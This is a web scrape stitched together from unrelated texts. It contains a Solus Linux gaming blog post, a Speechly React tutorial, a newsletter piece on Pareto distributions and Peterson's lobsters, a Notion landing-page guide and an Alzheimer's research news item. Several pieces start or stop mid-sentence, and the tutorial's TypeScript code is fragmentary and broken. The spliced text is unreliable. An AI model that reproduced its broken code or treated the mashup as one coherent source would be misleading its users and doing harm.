<p>I logged in and a lot of things were just working, which was great, but then again my expectations were very low coming from Arch. There was a remarkable lack of shit installed by default. LibreOffice is there but not GIMP, and there’s only 1 video player instead of 4. As a result I didn’t spend any time undoing defaults, which I had fully expected from a “home computing” distribution.</p>
<h2 id="who-needs-terminals">Who Needs Terminals?</h2>
<p>I got Steam and Proton installed again, this time with no hassle because I used the Solus Software Centre and it just worked. Whilst that was downloading I copied Garry’s Mod over from another Windows computer on the network through the file manager because apparently it just supports CIFS out of the box. I launched that game no problem, so then I started looking at Lutris again.</p>
<p>I was under the impression that I was going to need Lutris to play basically anything that wasn’t a Steam native Linux game. It turns out that is not entirely true. My next game goal was Elite Dangerous, so I copied it over the network too and Steam picked it up fine. Testing my luck I just hit “play” with the Steam Proton version set to the latest beta, but it did absolutely nothing. Then I tried launching it through Lutris. I got a bit suspicious when I saw the Steam install downloader pop up, and then I realized it was creating its own “prefix” for Steam Windows under Wine, ignoring the system version I had installed entirely.</p>
<p>So I wasn’t going to use Lutris for Elite then, and I got a bit worried. If it didn’t launch through Steam would it work at all? I searched around and saw lots of people trying to get it to work, and then I found <a href="https://github.com/ValveSoftware/Proton/issues/150">this Github issue</a> which lead to <a href="https://github.com/redmcg/wine/releases/tag/ED_Proton_3.16-6_Beta">this forked repo release</a>. With that, I had the game running flawlessly in like 20 minutes, and I even <a href="https://twitter.com/m1cr0m4n/status/1076614809414782976">tweeted about it</a>.</p>
<p>Other than installing the ED Proton fork, I had no need for a terminal during this process. I call that a testament to this OS. Generally, I only need a terminal when something breaks or something is more easily/quickly done at the prompt. My point being that if you were a Windows gamer trying to justify the conversion, you can rest assured that there is no need for any prior knowledge of Linux, or maybe even computers, to pull this off.</p>
<h2 id="real-work-on-solus">Real Work on Solus</h2>

<p><a href="https://m1cr0man.com/posts/gaming-on-linux/images/Screenshot%20from%202018-12-24%2001-20-04.jpg"><img src="https://m1cr0man.com/posts/gaming-on-linux/images/Screenshot%20from%202018-12-24%2001-20-04_huc4494bcc592d409b6b1867b12478b696_518421_0x384_resize_q85_gaussian.jpg" title="Solus"></a></p><p>It’s been so long since I used a “real” distro I can’t really separate what is unique to Solus from the common features you get nowadays. Setting up my networking and audio was painless. It’s Network Manager based networking with that regular GNOME GUI you see everywhere. You can control your audio volumes per-application from the pop out side bar in the UI. I noticed whilst I was installing all sorts of random stuff that the Solus not-a-start-menu was populating shortcuts and categories for everything. Also once I got the Nvidia driver installed everything like moving windows around was silky smooth. Honestly, I don’t think I want to use i3 any more.</p>
<p>With this level of confidence, I even went and setup my browser, IRC client, and a bunch of other stuff I would only do if I was committed to an install. What I wanted to try next was remote desktop gaming using TurboVNC, and I immediately encountered a problem. TurboVNC wasn’t in Solus' repositories so I was going to have to build it myself. I’m so glad I did.</p>
<p>Solus has a really nice YAML based system for developing packages. It does 90% of the work for you which is awesome. It will setup a build environment in a chroot, install dependencies, run commands, and generate a package all based on this one package.yaml. Their documentation on this setup is quite easy to follow, but I did pop into their IRC for a few questions.</p>
<p>I ended up building 3 packages for TVNC + its dependencies, and it didn’t take too long. From talking to a few developers and package maintainers, I’m quite tempted to submit + maintain these packages for Solus too. This blog post isn’t going to be about remote desktop gaming though so I’ll leave that for another day.</p>
<h2 id="convincing-the-family">Convincing the Family</h2>
<p>Over this weekend I played around 8 hours of Elite, whilst on Discord, on this really weirdly spec’d computer with an i3 2100 and a GTX 970. I had zero issues, both in setup and performance, and I spent way more time actually playing the games than I expected to.</p>
<p>When I mention the idea of using Linux to my brother, I always get an immediate no. “It’s for geeks”, “I can’t code”, “X won’t run on it”. I was able to prove him wrong on at least 2 of his points, but really it would be so much better if we all ran Linux. One of the biggest problems we have at the moment is that every time we make a significant hardware change to one of our computers, we have to reload the OS. We wouldn’t have to do that if we were running Solus on all the PCs. Also, Windows 7 isn’t exactly secure anymore. It hasn’t got real updates in like 2 years now, and we have turned them off before that to avoid breaking some games relying on old DRM (read: Securom) technology.</p>
<p>I don’t think it is going to take me much longer to convert every one given how much faster, simpler and prettier running a modern Linux distribution is. So long as I can prove that new and old games will work fine and continue to work when I’m not around I might be in for a chance of having a standardized boot image on all of our computers. This is appealing because living in Donegal you can’t be doing any sort of updates whilst playing games online otherwise your ping will go through the roof. You still have to do updates at some point, the question is how many times do you have to do them.</p>
<p>I’ll continue to test more games and work out a way I can easily deploy an entire Linux gaming setup to more computers. It is already exceptionally simple, but I need a turnkey solution to running Windows games on Steam that I can hand to people that have no idea what <code>ls</code> does.</p>

  <div>
    <div>
      <h3 id="introduction">Introduction</h3>
<p>This tutorial will help you to get up and running with Speechly by guiding you through the process of building a simple voice filtering web app with Speechly and React.</p>
<p>You can find the source code for this tutorial <a href="https://github.com/speechly/react-example-repo-filtering">on GitHub</a> and you can also try out the final result <a href="http://speechly.github.io/react-example-repo-filtering/">hosted on GitHub Pages</a>.</p>
<h3 id="prerequisites">Prerequisites</h3>
<p>Since we’ll be using <a href="https://create-react-app.dev/docs/getting-started">create-react-app</a> for this tutorial, we’ll need the following tools:</p>
<ul>
<li>Node.js 8.10+</li>
<li>npm 5.2+</li>
</ul>
<p>Note that this tutorial also uses TypeScript, so feel free to check out <a href="https://www.typescriptlang.org/docs">TypeScript documentation</a> if you’re not familiar with it.</p>
<h3 id="1-creating-an-app">1. Creating an app</h3>
<p>Let’s get started by creating an app and installing its dependencies:</p>
<div><pre><code data-lang="sh">npx create-react-app speechly-voice-filter --typescript
<span>cd</span> speechly-voice-filter
npm i
</code></pre></div><p>Now that you’ve created the app, you can check it out by running <code>npm start</code> - it should open a browser tab with your app running in it.</p>
<h3 id="2-adding-data-and-layout">2. Adding data and layout</h3>
<p>Since we are building a filtering app, let’s add some data to filter and layout to display it.</p>
<p>To make it simple, our data source will be just a static array with some popular repositories on GitHub. Let’s add the following code and save it as <code>src/data.ts</code>:</p>
<div><pre><code data-lang="ts"><span>export</span> type Repository <span>=</span> {

<div><pre><code data-lang="tsx"><span>import</span> React from <span>"react"</span>;

<span>import</span> { repositories } from <span>"./data"</span>;

<span>import</span> { RepoList } from <span>"./RepoList"</span>;

<div><pre><code data-lang="tsx"><span>import</span> React from <span>"react"</span>;
<span>import</span> { SpeechProvider } from <span>"@speechly/react-client"</span>;

<p>Before we proceed with the app, let’s take a quick detour and train a very simple and not very useful Speechly app, so that we can use it to test our integration later on.</p>
<p>Go to <a href="https://speechly.com/dashboard">https://speechly.com/dashboard</a> and login (or sign up if you haven’t yet) and create a new app (you can <a href="https://www.speechly.com/docs/quick-start/">check our Speechly Dashboard quickstart guide</a> if you feel lost). Feel free to use any configuration you want, even an almost empty configuration with just “Hello world” will suffice, but make sure your app is deployed!</p>

        </figcaption>
</figure>
<p>Once you have your Speechly app deployed, let’s integrate it. Start by installing Speechly React client:</p>
<div><pre><code data-lang="sh">npm i --save @speechly/react-client
</code></pre></div><p>The client exposes a context provider and a hook that allows you to consume that context. Let’s add the context provider to <code>src/App.tsx</code>. Make sure you provide the <code>App ID</code> of your Speechly app as a property for <code>SpeechProvider</code>!</p>
<div><pre><code data-lang="tsx"><span>import</span> React from <span>"react"</span>;
<span>import</span> { SpeechProvider } from <span>"@speechly/react-client"</span>;

<span>import</span> <span>"./App.css"</span>;

<span>function</span> App()<span>:</span> JSX.Element {
  <span>return</span> (
    <span>&lt;</span>div className<span>=</span><span>"App"</span><span>&gt;</span>
      <span>&lt;</span>SpeechProvider appId<span>=</span><span>"your-app-id-here"</span> language<span>=</span><span>"en-US"</span><span>&gt;</span>
        <span>&lt;</span>SpeechApp <span>/&gt;</span>

    <span>&lt;</span><span>/div&gt;</span>
  );
}

<span>export</span> <span>default</span> App;
</code></pre></div><p>Next, let’s add some code to act as the microphone button. Also, it would be nice to see what we are saying, so let’s also render the transcript next to the button for some feedback. Let’s make that a separate component and save it as <code>src/Microphone.tsx</code>:</p>
<div><pre><code data-lang="tsx"><span>import</span> React from <span>"react"</span>;
<span>import</span> {

        text <span>=</span> <span>"Stop"</span>;
        <span>break</span>;
      <span>case</span> SpeechState.Connecting:
      <span>case</span> SpeechState.Loading:

        text <span>=</span> <span>"Loading..."</span>;
        <span>break</span>;
    }

    <span>return</span> (
      <span>&lt;</span>div<span>&gt;</span>
        <span>&lt;</span>button onClick<span>=</span>{onRecord} disabled<span>=</span>{<span>!</span>enabled}<span>&gt;</span>

      <span>&lt;</span><span>/div&gt;</span>
    );
  }
);

<span>const</span> Transcript <span>=</span> React.memo(
  ({ segment }<span>:</span> { segment?: <span>SpeechSegment</span> })<span>:</span> JSX.Element <span>=&gt;</span> {
    <span>if</span> (segment <span>===</span> <span>undefined</span>) {
      <span>return</span> (
        <span>&lt;</span>div<span>&gt;</span>
          <span>&lt;</span>em<span>&gt;</span>Waiting <span>for</span> speech input...<span>&lt;</span><span>/em&gt;</span>
        <span>&lt;</span><span>/div&gt;</span>
      );
    }

    <span>return</span> (
      <span>&lt;</span>div<span>&gt;</span>
        {segment.words.map((w) <span>=&gt;</span> (
          <span>&lt;</span>Word word<span>=</span>{w} key<span>=</span>{w.index} <span>/&gt;</span>
        ))}
      <span>&lt;</span><span>/div&gt;</span>
    );

<span>const</span> Word <span>=</span> React.memo(

  }
);
</code></pre></div><p>As you can see, this component renders a button that calls the <code>onRecord</code> callback passed in the properties and uses the state of Speechly client to determine when to enable the button and which text to use as its label. In addition to that, the component also renders the transcript of the phrase by assembling individual transcripted words from a segment (check out <a href="https://www.speechly.com/docs/speechly-api/#understanding-server-responses">this article in our documentation</a> for more information about how SLU API works). Since a word can be either tentative (i.e., its value can change as the API receives more audio data) or final, we use bold text to highlight final words.</p>
<p>One more step - we’d need to render our component and hook it up to the API. Let’s add it to our <code>SpeechApp</code> component:</p>
<div><pre><code data-lang="tsx"><span>import</span> React from <span>"react"</span>;
<span>import</span> { useSpeechContext } from <span>"@speechly/react-client"</span>;

<span>import</span> { repositories } from <span>"./data"</span>;

<span>import</span> { RepoList } from <span>"./RepoList"</span>;
<span>import</span> { Microphone } from <span>"./Microphone"</span>;

<span>export</span> <span>const</span> SpeechApp: <span>React.FC</span> <span>=</span> ()<span>:</span> JSX.Element <span>=&gt;</span> {
  <span>const</span> { toggleRecording, speechState, segment } <span>=</span> useSpeechContext();

Peterson</a></strong>&nbsp;is a Canadian clinical psychologist and psychology professor at the University of Toronto who became a controversial figure in late-2016 for his critiques of political correctness. Peterson’s most recent book, 12 Rules for Life, has sold over 3 million copies worldwide. Most recently, Peterson has suffered from health issues that necessitated a year-long reprieve from the public eye.</p><h4><strong>Success compounds, meaning those that win tend to continue to win</strong></h4><p>Lobsters are interesting animals, but most people don’t think about them too often. <a href="https://www.smithsonianmag.com/science-nature/dont-listen-to-the-buzz-lobsters-arent-actually-immortal-88450872/">While they may not be immortal as many like to think</a>, they never stop growing and can regenerate lost limbs. Unfortunately for them, they taste good with butter - but let’s circle back to lobsters here in a minute.</p><p>In the early 1900s, an Italian engineer, sociologist, economist, political scientist, and philosopher (but he was probably no fun at parties, so you got him there) named <a href="https://en.wikipedia.org/wiki/Vilfredo_Pareto#Economic_concepts">Vilfredo Pareto</a> became fascinated by the ideas of wealth and power - namely, how is wealth distributed across society? (Interestingly, he did not start this work until his forties, <a href="https://newsletter.butwhatfor.com/p/takeaway-friday-a-stoic-philosopher">so it is never too late to make a difference</a>.)</p><p>Ever diligent, he pulled data from the 1400s through his modern times and found the same pattern everywhere. Whereas people had previously assumed that wealth would be distributed in a flat, upward-sloping line from poor to rich, what Pareto found was in fact a hockey stick - a small percentage of the population holds a majority of the wealth.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffcb31aa6-3ff3-4fba-b50a-82da1fb89f75_700x400.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffcb31aa6-3ff3-4fba-b50a-82da1fb89f75_700x400.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/fcb31aa6-3ff3-4fba-b50a-82da1fb89f75_700x400.png&quot;,&quot;height&quot;:400,&quot;width&quot;:700,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:110387,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p>This kind of distribution - the most successful / most productive / largest “winners” continuously having a greater chunk of the pie - can be seen across many different fields.</p><blockquote><p>That same brutal principle of unequal distribution applies outside the financial domain—indeed, anywhere that creative production is required. The majority of scientific papers are published by a very small group of scientists. A tiny proportion of musicians produces almost all the recorded commercial music. Just a handful of authors sell all the books. A million and a half separately titled books (!) sell each year in the US. However, only five hundred of these sell more than a hundred thousand copies. Similarly, just four classical composers (Bach, Beethoven, Mozart, and Tchaikovsky) wrote almost all the music played by modern orchestras. Bach, for his part, composed so prolifically that it would take decades of work merely to hand-copy his scores, yet only a small fraction of this prodigious output is commonly performed...</p><p>It also applies to the population of cities (a very small number have almost all the people), the mass of heavenly bodies (a very small number hoard all the matter), and the frequency of words in a language (90 percent of communication occurs using just 500 words), among many other things. Sometimes it is known as the Matthew Principle (Matthew 25:29), derived from what might be the harshest statement ever attributed to Christ: “to those who have everything, more will be given; from those who have nothing, everything will be taken.”</p></blockquote><p>This idea was further expanded in the mid-1900s when British physicist <a href="https://en.wikipedia.org/wiki/Derek_J._de_Solla_Price">Derek Price</a> noticed that certain of his colleague were prolific publishers and others - well, not so much. In fact, Price could fit most domains of publication to a “law” stating that half of all papers are written by the square root of the number of all writers - if you had 100 papers written by 25 people, 50 papers would have been written by only 5 individuals. If it was 1,000 papers and 250 people, 500 papers were written by only 16 people. Thus, there was always an active minority generating the majority of the work.</p><p>These results can be understood as it relates to the compounding effects of resources - those that have previously “won” generally have access to the greatest resources and can more easily utilize those resources to achieve additional success. Those without resources cannot. </p><p>Thus, resources beget additional resources while losing resources restricts your ability to gain resources in the future - <em>winners are more likely to win again, and losers more likely to lose</em>.</p><p>However, there is also something going on in the brain that makes those that win more likely to pursue meaningful, productive activities again in the future.</p><h4>Your brain is aware of where you are within the winner-loser continuum and makes plans based on where it thinks you sit</h4><p>Back to the lobsters. Lobsters live in a cold, brutal world where things such as ideal lobster nests (think “safe hiding places”) and access to food are both paramount and scarce. This scarcity can result in conflict. So how do you determine which lobsters lay claim to the best nests?</p><p>As you might have guessed, they fight for them - and Peterson goes into detail on lobster confrontation rituals in his book. Important to this conversation is what happens in the brains of lobsters that win and lobsters that lose.</p><blockquote><p>A lobster loser’s brain chemistry differs importantly from that of a lobster winner. This is reflected in their relative postures. Whether a lobster is confident or cringing depends on the ratio of two chemicals that modulate communication between lobster neurons: serotonin and octopamine. Winning increases the ratio of the former to the latter.</p><p>A lobster with high levels of serotonin and low levels of octopamine is a cocky, strutting sort of shellfish, much less likely to back down when challenged. This is because serotonin helps regulate postural flexion. A flexed lobster extends its appendages so that it can look tall and dangerous, like Clint Eastwood in a spaghetti Western…</p><p>High serotonin/low octopamine characterizes the victor. The opposite neurochemical configuration, a high ratio of octopamine to serotonin, produces a defeated-looking, scrunched-up, inhibited, drooping, skulking sort of lobster, very likely to hang around street corners, and to vanish at the first hint of trouble.</p></blockquote><p>The lobster’s brain knows whether it just lost or won a fight. The victor confidently holds himself up high and the loser shirks from potential conflict. And this makes sense - it is advantageous to your survival to avoid conflict if you tend to lose because 1) you tend to lose and 2) having lost, you now have access to less advantageous resources (food and shelter). The winner is confident in his access to resources and knows, based on experience, that he can win future fights.</p><p>These changes in how the lobster orients itself to the world start deep within its brain, with levels of serotonin driving physical changes in the external lobster. This brain infrastructure is very similar to what sits inside humans, who also take into account where they are in the “tend to win and have resources / tend to lose and don’t have resources” continuum.</p><blockquote><p>The part of our brain that keeps track of our position in the dominance hierarchy is therefore <a href="https://newsletter.butwhatfor.com/p/takeaway-tuesday-knowing-history">exceptionally ancient and fundamental</a>.&nbsp;It is a master control system, modulating our perceptions, values,&nbsp;emotions, thoughts and actions…</p><p>The ancient part of your brain specialized for assessing dominance watches how you are treated by other people. On that evidence, it renders a determination of your value and assigns you a status. If you are judged by your peers as of little worth, the counter restricts serotonin availability. That makes you much more physically and psychologically reactive to any circumstance or event that might produce emotion, particularly if it is negative. You need that reactivity. Emergencies are common at the bottom, and you must be ready to survive.</p></blockquote><p>If you are lower on the totem pole, being constantly prepared for emergencies eventually takes its toll on you given your orientation towards short-term survival at the expense of long-term success. It impacts everything, from the way your body allocates resources to its immune system (long-term investment) to your fight-or-flight response sensitivity (expensive short-term preparedness). </p><p>But this all makes sense for the competitive world our ancestors grew up in. </p><blockquote><p>Unfortunately, that physical hyper-response, that constant alertness, burns up a lot of precious energy and physical resources. This response is really what everyone calls stress, and it is by no means only or even primarily psychological. It’s a reflection of the genuine constraints of unfortunate circumstances. When operating at the bottom, the ancient brain counter assumes that even the smallest unexpected&nbsp;impediment might produce an uncontrollable chain of negative events, which will have to be handled alone, as useful friends are rare indeed, on society’s fringes. You will therefore continually sacrifice what you could otherwise physically store for the future, using it up on heightened readiness and the possibility of immediate panicked action in the present… The physical demands of emergency preparedness will wear you down in every way.</p><p>If you have a high status, on the other hand, the counter’s cold, pre-reptilian mechanics assume that your niche is secure, productive and safe, and that you are well buttressed with social support. It thinks the chance that something will damage you is low and can be safely discounted. Change might be opportunity, instead of disaster. The serotonin flows plentifully. This renders you confident and calm, standing tall and straight, and much less on constant alert. Because your position is secure, the future is likely to be good for you. It’s worthwhile to think in the long term and plan for a better tomorrow.</p></blockquote><h4>Feedback loops can both hurt you and help you</h4><p>This whole process is an example of an <a href="https://en.wikipedia.org/wiki/Autocatalysis#:~:text=A%20single%20chemical%20reaction%20is,is%20called%20an%20autocatalytic%20reaction.">autocatalytic reaction</a> - a chemical reaction where one of the reaction products (in this case “losing”) …</p></div></div>

In fact, Tem published the first Notion website back in March 2020 (oh, how the world has changed). </span></span></p><p><span><span>Thanks in large to awesome projects like Super and Fruition, building websites on Notion became easier and faster. </span></span></p><p><span><span>Given the surge in popularity, I deciced to pen this comprehensive guide and create some duplicable blocks, so you can create your own Notion website in no time — enjoy 🙌</span></span></p></div></div><h2><span id="cc149452e88b42e8b29622443a589d9c"></span><span><span>🔑 An overview of the guide</span></span></h2><div id="c496b9ce8126498e85222feb210e850b"><div id="4e7f6e020650473a8d103736b9068090"><p><span><span>Making a landing page with Notion is easy to the point of enjoyable — you don't need any coding skills at all. It's also flexible — you can mix, match, and style various blocks to get the look and feel needed to present your idea (or product) just the right way.</span></span></p><p><span><span>This guide will walk you through every step of setting up your landing with Notion, publishing it to the web, adding analytics and custom styling. As a cherry on top, we've also curated 10 ready-made components that you can use to get your Notion landing page out in no time.</span></span></p></div></div><h2><span id="4b158c7e538e49518051b4d9b3d1f780"></span><span><span>🎯 Setting your landing page goals</span></span></h2><p><span><span>Landing pages are the best way to "sell" something, to tell people about a specific product, service or a resource, and make them do a specific action. </span></span></p><p><span><span>When user does an action, this is called "conversion", and usually landing pages are fine-tuned to get as much conversions as possible. Conversions could be anything: from subscribing to a newsletter or joining a community, to buying a product or a service. Landing pages can be purely informational, too. </span></span></p><p><span><span>Think what's the purpose of your page, and what the user needs to do to contribute.</span></span></p><h2><span id="cbfc301b7d274e27a06afc720d7eb511"></span><span><span>🤔 Deciding on what to show on the landing page</span></span></h2><p><span><span>Defining your goal was the hard part — after you know what action you want the user to make, it's easy to define what to show on your landing. </span></span></p><p><span><span>If they're subscribing to a newsletter, tell what it's about. If the goal is to grow a community, tell about the people already there and show what's the purpose of this community. If you're selling a product, focus on the value it offers and on core functionality. Don't forget call-to-actions to let the user actually realize their interest when they're convinced.</span></span></p><p><span><span>Take a look at </span><span><a target="_blank" rel="noopener noreferrer" href="https://demandcurve.com/#1opac8uusrjldfqjb39wpp">Demand Curve</a></span><span>'s landing page, for example. </span></span></p><div id="54fa9f431f9a45fc970d6e7fc90bf338"><picture><source srcset="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>They're advertising their start-up program, focusing on what the program is about, how it's structured and why people learn valuable things during that program. It's all there — right on the first screen you can see the bullet points describing what the program is about (Growth Strategy, Ads, etc.).</span></span></p><p><span><span>Demand Curve's team also put a special emphasis on social proof — there's a ton of different testimonials and stories from people on the page.</span></span></p><p><span><span>Sometimes short landing pages that span 1-2 screens have higher conversion that longer ones, that span 3 and more screens. When you need your user to perform a simple action, like sharing their email, a short page works better. Short landings also make more sense for "warm" clients who already know what you are offering.</span></span></p><p><span><span>Longer landings with lots of information work better for "cold" clients, because they need more context. After you have an idea on what size is appropriate in your case, you can start experimenting with content.</span></span></p><h2><span id="3812d49b74904f9d961961ff3c8b07b9"></span><span><span>🖋️ Adding some content</span></span></h2><p><span><span>On a typical landing page, the information is arranged into standard "blocks" with valuable information:  there's an eye-catching Hero image, simple text blocks describing your value proposition, a call-to-action that lets you collect interest, and a footer with terms. </span></span></p><p><span><span>Like on </span><span><a target="_blank" rel="noopener noreferrer" href="https://www.refactoringgrowth.com/">Refactoring Growth</a></span><span>'s landing page, you have an elaborate introduction, several sections with a value proposition (simple text) block and a picture or a graphic, a pricing block and a Call-to-Action.</span></span></p><div id="c32142c387d44b52b7995b22ae6c17c9"><picture><source srcset="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>Optionally, you can add more useful stuff. It's a good idea to include social proof (which is very important for conversions and creates a sense of community around your value prop), juicy product shots or screenshots and a blog section linking to your posts somewhere else. </span></span></p><div id="d3e8989030c247cba938e6e513c95e1d"><picture><source srcset="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=1500" alt="image" loading="lazy"></picture></div><h2><span id="f07e89f0db6c4c5188083b57316e7685"></span><span><span>🎁 Ready-made landing page blocks</span></span></h2><p><span><span>We've assembled some common sections in Notion so you can borrow them for your website.</span></span></p><p><span><span>Just open the component you like below, click on the bookmark, then click "Duplicate" and drag your component's page into any page you like. Select "Turn into", then "text". You've got your landing page! Add some space between the blocks, change the content and delete the toggle. Then customize it as you like.</span></span></p><p><span><span>Here's a 53-second demo: </span></span></p><p><span><span>Mix and match the blocks and add your own section to make your own converting landing page in 10 minutes.</span></span></p><h2><span id="dbfa3c0dca5f4aada94f5376166f8281"></span><span><span>🌐 Publish your page to the web </span></span></h2><p><span><span>It's easy to publish your page and make it accessible from a custom domain. 
We like two services: </span><span><a target="_blank" rel="noopener noreferrer" href="https://fruitionsite.com/">Fruition</a></span><span> is free and open-source, while </span><span><a target="_blank" rel="noopener noreferrer" href="https://super.so/">Super</a></span><span> offers more functionality and better performance. </span></span></p><p><span><span>Fruition has a </span><span><a target="_blank" rel="noopener noreferrer" href="https://fruitionsite.com/">very elaborate guide</a></span><span> right on their home page, and a </span><span><a target="_blank" rel="noopener noreferrer" href="https://www.youtube.com/watch?v=aw0x54PzCaI">video tutorial</a></span><span>, and Super gives a good onboarding when you sign up, leading you through all the necessary steps. 

</span><span><span>Here's a step-by-step to get you going on Super:</span></span></span></p><ol><li id="30fa5f0ef68b4ad79354c951f1b9aba1"><span><span>Sign up, select a plan (essentially boils down to how many sites you need, keep in mind that one site can have many subpages, like any website on the Web)
</span></span></li><li id="787193987a0b4c7c95437a027e1bd716"><span><span>Select whether you want to make a static website out of your page, or go with a default Notion-based method. 

First option offers great performance, but doesn't allow for filtered views and calendars on your page. 

Default Notion page is relatively poor in terms of performance and SEO, but all Notion functionality will work and it's still enough for simple personal websites or pages where you don't need fast loading.
</span></span></li><ol></ol><li id="e44a993f1fce466193429d780f87fd90"><span><span>Select your site name used in Super, a custom domain from a domain provider, and the URL to your original Notion page with the page set to public via the "Share" menu at the top ("Share" → "Share to the Web")
</span></span></li><li id="2aa6fd185ae9449084ed3674d150ac83"><span><span>Add one or more pretty URLs if you need them. By default, all the sub-pages you add inside your home page will have ugly Notion URLs. You can change that by providing links to sub-pages you want to add slugs to and specifying the slug (e.g. </span><span><a target="_blank" rel="noopener noreferrer" href="http://optemization.com/preconceived">optemization.com/preconceived</a></span><span>)
</span></span></li><li id="ff4df464b80145149fe1675f38702e2b"><span><span>Add A and CNAME records to point Super to your domain name (Super provides these and you need to enter them in your domain provider's control panel). You can also provide an API Key if it's GoDaddy.</span></span></li><ol></ol><li id="52d2dce988b94c798bc7fafc30303552"><span><span>Enter your site's description, attach an image and an icon for social sharing. You can also select a custom font for your page's contents at this point.
</span></span></li></ol><p><span><span>Voila! The site should now be public. You're awesome.</span></span></p><h2><span id="728b3a07a7f3429b818b7992351d8dfa"></span><span><span>🔢 Add analytics</span></span></h2><p><span><span>With both Super and Fruition, you can inject your own Javascript into your page. This means you can use most of analytics solutions available.</span></span></p><p><span><span>For example, you can get your Fathom Analytics script to inject by going to Settings → Site → Site ID. Here's their own Fathom's </span><span><a target="_blank" rel="noopener noreferrer" href="https://usefathom.com/support/tracking">instruction</a></span><span>. Google Analytics also has a global site tag you can inject. </span></span></p><p><span><span>Both look like this (from Super's landing):</span></span></p><pre id="c777ed719650472ea7f2d1bb17322dd3"><code><span><pre><code><span>&lt;</span><span>script src</span><span>=</span><span>"https://cdn.analytics.com"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>script</span><span>&gt;</span></code></pre></span></code></pre><p><span><span>After you copy and paste the script into the right field in Super or with Fruition, it should should auto-magically start collecting your stats and you'll be able to see them in your analytics dashboard. These are statistics we measure for </span><span><a target="_blank" rel="noopener noreferrer" href="http://optemization.com/">optemization.com</a></span><span>:</span></span></p><h2><span id="4b1780ab79904f75abb4ecda48f54fd6"></span><span><span>✨Add styling </span></span></h2><p><span><span>In theory, with Super or Fruition you can style practically any part of your page. One of the simple things to do is to change default Notion colors. To change any color on your page just add a script (the same way you add an analytics script) that replaces Notion's CSS values.</span></span></p><p><span><span><a target="_blank" rel="noopener noreferrer" href="https://demo.super.so/guides/colors">Super</a></span><span> has a great mini-guide on doing that, below is the script with every default Notion color. Just replace the color you want to change with a HEX value (#000 for black, #fff for white) and delete the rest to change colors for a site hosted with Super (Fruition works the same way).</span></span></p><details id="cd15c584098c4a26b2e6aeadc95bd312"><summary><span><span>Notion's core colors (check the full list here: </span><span><span><a id="/fed8e0f6059d469fadaeeac47812b6e7" href="https://optemization.com/fed8e0f6059d469fadaeeac47812b6e7"><div><p><img src="https://super.so/icon/dark/hexagon.svg" alt="Notion Colors"></p><p><span><span>Notion Colors</span></span></p></div></a></span></span><span>)</span></span></summary><div><pre id="675898bed12c4045ac7bdd3c20ed3ae3"><code><span><pre><code><span>&lt;</span><span>style</span><span>&gt;</span><span>

                                                  <div>
                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

